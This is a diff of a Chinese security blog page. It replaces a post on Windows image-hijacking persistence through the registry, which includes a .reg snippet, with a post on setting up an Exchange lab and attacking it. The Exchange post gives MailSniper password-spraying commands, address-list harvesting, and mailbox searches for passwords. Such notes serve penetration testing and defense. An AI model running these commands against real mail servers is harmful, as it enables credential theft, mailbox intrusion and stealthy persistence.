@@ -79,19 +79,22 @@
 
 
 
-<meta name="description" content="什么是映像劫持？映像劫持（Image File Execution Options），简单的说法，就是当你打开的是程序A，而运行的确是程序B。 利用GFlages.exe来使映像劫持更好玩。下载地址：1http://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebug">
+<meta name="description" content="0x01 环境搭建12server 2012exchange 2013 坑 2012安装vmware tools  12安装需要先打个补丁，kb2919355，但是你要是直接装的话，还装不上。具体参考链接：https://blog.csdn.net/qwq1503/article/details/65916426  记得先改一下计算机名  1不改也能用，就是比较傻  装好exchange以后，记得">
 <meta property="og:type" content="article">
-<meta property="og:title" content="映像劫持">
-<meta property="og:url" content="http://yangge.me/2018/07/16/映像劫持/index.html">
+<meta property="og:title" content="Exchange环境搭建以及攻击漏洞利用">
+<meta property="og:url" content="http://yangge.me/2019/02/01/Untitled/index.html">
 <meta property="og:site_name">
-<meta property="og:description" content="什么是映像劫持？映像劫持（Image File Execution Options），简单的说法，就是当你打开的是程序A，而运行的确是程序B。 利用GFlages.exe来使映像劫持更好玩。下载地址：1http://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebug">
+<meta property="og:description" content="0x01 环境搭建12server 2012exchange 2013 坑 2012安装vmware tools  12安装需要先打个补丁，kb2919355，但是你要是直接装的话，还装不上。具体参考链接：https://blog.csdn.net/qwq1503/article/details/65916426  记得先改一下计算机名  1不改也能用，就是比较傻  装好exchange以后，记得">
 <meta property="og:locale" content="Zh/Cn">
-<meta property="og:image" content="http://yangge.me/images/pasted-0.png">
-<meta property="og:updated_time" content="2018-07-26T08:01:34.093Z">
+<meta property="og:image" content="https://i.loli.net/2019/02/01/5c54226ba0d74.png">
+<meta property="og:image" content="https://i.loli.net/2019/02/01/5c54234702b8e.png">
+<meta property="og:image" content="https://i.loli.net/2019/02/02/5c556858e935e.png">
+<meta property="og:image" content="https://i.loli.net/2019/02/02/5c55698b8ce7f.jpg">
+<meta property="og:updated_time" content="2019-02-02T09:58:21.918Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="映像劫持">
-<meta name="twitter:description" content="什么是映像劫持？映像劫持（Image File Execution Options），简单的说法，就是当你打开的是程序A，而运行的确是程序B。 利用GFlages.exe来使映像劫持更好玩。下载地址：1http://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebug">
-<meta name="twitter:image" content="http://yangge.me/images/pasted-0.png">
+<meta name="twitter:title" content="Exchange环境搭建以及攻击漏洞利用">
+<meta name="twitter:description" content="0x01 环境搭建12server 2012exchange 2013 坑 2012安装vmware tools  12安装需要先打个补丁，kb2919355，但是你要是直接装的话，还装不上。具体参考链接：https://blog.csdn.net/qwq1503/article/details/65916426  记得先改一下计算机名  1不改也能用，就是比较傻  装好exchange以后，记得">
+<meta name="twitter:image" content="https://i.loli.net/2019/02/01/5c54226ba0d74.png">
 
 
 
@@ -121,13 +124,13 @@
 
 
 
-  <link rel="canonical" href="http://yangge.me/2018/07/16/映像劫持/"/>
+  <link rel="canonical" href="http://yangge.me/2019/02/01/Untitled/"/>
 
 
 
 
 
-  <title>映像劫持 | </title>
+  <title>Exchange环境搭建以及攻击漏洞利用 | </title>
   
 
 
@@ -234,7 +237,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yangge.me/2018/07/16/映像劫持/">
+    <link itemprop="mainEntityOfPage" href="http://yangge.me/2019/02/01/Untitled/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="yangge">
@@ -251,7 +254,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">映像劫持</h1>
+          <h1 class="post-title" itemprop="name headline">Exchange环境搭建以及攻击漏洞利用</h1>
         
 
         <div class="post-meta">
@@ -263,8 +266,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-07-16T14:39:09+08:00">
-                2018-07-16
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-01T17:11:05+08:00">
+                2019-02-01
               </time>
             
 
@@ -282,9 +285,9 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2018/07/16/映像劫持/#comments" itemprop="discussionUrl">
+                <a href="/2019/02/01/Untitled/#comments" itemprop="discussionUrl">
                   <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2018/07/16/映像劫持/" itemprop="commentCount"></span>
+                        data-disqus-identifier="2019/02/01/Untitled/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -312,13 +315,47 @@
       
 
       
-        <h4 id="什么是映像劫持？"><a href="#什么是映像劫持？" class="headerlink" title="什么是映像劫持？"></a>什么是映像劫持？</h4><p>映像劫持（Image File Execution Options），简单的说法，就是当你打开的是程序A，而运行的确是程序B。</p>
-<p>利用GFlages.exe来使映像劫持更好玩。<br>下载地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebuggingTools_amd64/dbg_amd64.msi</span><br></pre></td></tr></table></figure></p>
-<p>用法如图</p>
-<p><img src="/images/pasted-0.png" width="50%"></p>
-<p>作用是关闭notepad.exe 以后自动打开calc.exe</p>
-<p>一键添加注册表脚本：<br>保存为test.reg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe]</span><br><span class="line"></span><br><span class="line">&quot;GlobalFlag&quot;=dword:00000200</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe]</span><br><span class="line"></span><br><span class="line">&quot;MonitorProcess&quot;=&quot;C:\\WINDOWS\\system32\\calc.exe&quot;</span><br><span class="line">&quot;ReportingMode&quot;=dword:00000001</span><br></pre></td></tr></table></figure></p>
-<p>还可以进行多跳操作，来隐藏真正的程序。</p>
+        <h3 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">server 2012</span><br><span class="line">exchange 2013</span><br></pre></td></tr></table></figure>
+<h5 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h5><ul>
+<li>2012安装vmware tools</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安装需要先打个补丁，kb2919355，但是你要是直接装的话，还装不上。</span><br><span class="line">具体参考链接：https://blog.csdn.net/qwq1503/article/details/65916426</span><br></pre></td></tr></table></figure>
+<ul>
+<li>记得先改一下计算机名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不改也能用，就是比较傻</span><br></pre></td></tr></table></figure>
+<ul>
+<li>装好exchange以后，记得域激活用户</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-User -RecipientTypeDetails User -Filter &#123; UserPrincipalName -ne $Null &#125; | Enable-Mailbox</span><br></pre></td></tr></table></figure>
+<h5 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h5><p>AD搭建是傻瓜化的，没啥问题。</p>
+<p>Exchange搭建要分步骤</p>
+<ol>
+<li><p>powershell执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Install-WindowsFeature AS-HTTP-Activation, Desktop-Experience, NET-Framework-45-Features, RPC-over-HTTP-proxy, RSAT-Clustering, RSAT-Clustering-CmdInterface, RSAT-Clustering-Mgmt, RSAT-Clustering-PowerShell, Web-Mgmt-Console, WAS-Process-Model, Web-Asp-Net45, Web-Basic-Auth, Web-Client-Auth, Web-Digest-Auth, Web-Dir-Browsing, Web-Dyn-Compression, Web-Http-Errors, Web-Http-Logging, Web-Http-Redirect, Web-Http-Tracing, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Lgcy-Mgmt-Console, Web-Metabase, Web-Mgmt-Console, Web-Mgmt-Service, Web-Net-Ext45, Web-Request-Monitor, Web-Server, Web-Stat-Compression, Web-Static-Content, Web-Windows-Auth, Web-WMI, Windows-Identity-Foundation, RSAT-ADDS</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>安装 NET Framework 4.5.2</p>
+</li>
+<li>忘了，反正会提示，缺啥装啥，主要是坑点。</li>
+</ol>
+<h5 id="搭建的服务目录及相关说明"><a href="#搭建的服务目录及相关说明" class="headerlink" title="搭建的服务目录及相关说明"></a>搭建的服务目录及相关说明</h5><p>装好以后，可以在iis管理器中看到exchange的几个目录</p>
+<p><img src="https://i.loli.net/2019/02/01/5c54226ba0d74.png" width="20%"><br><img src="https://i.loli.net/2019/02/01/5c54234702b8e.png" width="50%"></p>
+<h3 id="0x02-攻击利用"><a href="#0x02-攻击利用" class="headerlink" title="0x02 攻击利用"></a>0x02 攻击利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 爆破</span><br><span class="line">2. 拉取邮箱地址</span><br><span class="line">3. 搜索内容</span><br><span class="line">4. 命令执行</span><br></pre></td></tr></table></figure>
+<h5 id="1-爆破"><a href="#1-爆破" class="headerlink" title="1. 爆破"></a>1. 爆破</h5><p>爆破</p>
+<ul>
+<li><p>用burp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/Microsoft-Server-ActiveSync 爆破为401认证，需要对用户账号密码进行base64处理</span><br><span class="line">/ews、/rpc 等几个endpoint同样为401认证，账号密码的加密方式为net-ntlm</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用工具</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">owa爆破</span><br><span class="line">Invoke-PasswordSprayOWA -ExchHostname OWAHOST -UserList .\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose </span><br><span class="line"></span><br><span class="line">ews爆破</span><br><span class="line">Invoke-PasswordSprayEWS -ExchHostname EWSHOST -UserList .\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose </span><br><span class="line"></span><br><span class="line">通过Microsoft-Server-ActiveSync爆破：</span><br><span class="line">Invoke-PasswordSprayEAS -ExchHostname MSAHOST -UserList .\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose</span><br></pre></td></tr></table></figure>
+<h5 id="2-拉取邮箱地址"><a href="#2-拉取邮箱地址" class="headerlink" title="2. 拉取邮箱地址"></a>2. 拉取邮箱地址</h5><p>用到的工具：<a href="https://github.com/dafthack/MailSniper" target="_blank" rel="noopener">https://github.com/dafthack/MailSniper</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-GlobalAddressList -ExchHostname owaurl -UserName username -Password password</span><br></pre></td></tr></table></figure>
+<h5 id="3-搜索内容"><a href="#3-搜索内容" class="headerlink" title="3. 搜索内容"></a>3. 搜索内容</h5><p>内网中用来检索一个邮箱中的相关内容（使用当前用户登录）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SelfSearch -Mailbox user@domain.com -Terms *pass* -Folder all -ExchangeVersion Exchange2013_SP1 -OutputCsv 1.csv</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/02/02/5c556858e935e.png" alt=""></p>
+<p>如果有域管理密码，则可以检索任意邮箱内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-GlobalMailSearch -ImpersonationAccount beiguoxia -ExchHostname Exchangehostname -AdminUserName domain\administrator  -AdminPassword password -Term &quot;*pass*&quot; -Folder all</span><br></pre></td></tr></table></figure></p>
+<h5 id="4-命令执行"><a href="#4-命令执行" class="headerlink" title="4. 命令执行"></a>4. 命令执行</h5><p>命令执行这个，感觉不太好用，必须配合outlook，也就是说，对方必须使用outlook才能成功。<br>而且只能执行exe，就是不能带任何参数。<br><img src="https://i.loli.net/2019/02/02/5c55698b8ce7f.jpg" alt=""></p>
 
       
     </div>
@@ -343,8 +380,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/07/11/POC-T使用/" rel="next" title="POC-T使用">
-                <i class="fa fa-chevron-left"></i> POC-T使用
+              <a href="/2019/01/18/分块传输/" rel="next" title="分块传输">
+                <i class="fa fa-chevron-left"></i> 分块传输
               </a>
             
           </div>
@@ -352,10 +389,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/08/11/注册表关闭Windows-Defender-防火墙/" rel="prev" title="注册表关闭Windows Defender+防火墙">
-                注册表关闭Windows Defender+防火墙 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -499,7 +532,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#什么是映像劫持？"><span class="nav-number">1.</span> <span class="nav-text">什么是映像劫持？</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-环境搭建"><span class="nav-number">1.</span> <span class="nav-text">0x01 环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#坑"><span class="nav-number">1.0.1.</span> <span class="nav-text">坑</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#搭建"><span class="nav-number">1.0.2.</span> <span class="nav-text">搭建</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#搭建的服务目录及相关说明"><span class="nav-number">1.0.3.</span> <span class="nav-text">搭建的服务目录及相关说明</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-攻击利用"><span class="nav-number">2.</span> <span class="nav-text">0x02 攻击利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-爆破"><span class="nav-number">2.0.1.</span> <span class="nav-text">1. 爆破</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-拉取邮箱地址"><span class="nav-number">2.0.2.</span> <span class="nav-text">2. 拉取邮箱地址</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-搜索内容"><span class="nav-number">2.0.3.</span> <span class="nav-text">3. 搜索内容</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-命令执行"><span class="nav-number">2.0.4.</span> <span class="nav-text">4. 命令执行</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
@@ -669,9 +702,9 @@
     
       <script type="text/javascript">
         var disqus_config = function () {
-          this.page.url = 'http://yangge.me/2018/07/16/映像劫持/';
-          this.page.identifier = '2018/07/16/映像劫持/';
-          this.page.title = '映像劫持';
+          this.page.url = 'http://yangge.me/2019/02/01/Untitled/';
+          this.page.identifier = '2019/02/01/Untitled/';
+          this.page.title = 'Exchange环境搭建以及攻击漏洞利用';
         };
         var d = document, s = d.createElement('script');
         s.src = 'https://yangge.disqus.com/embed.js';
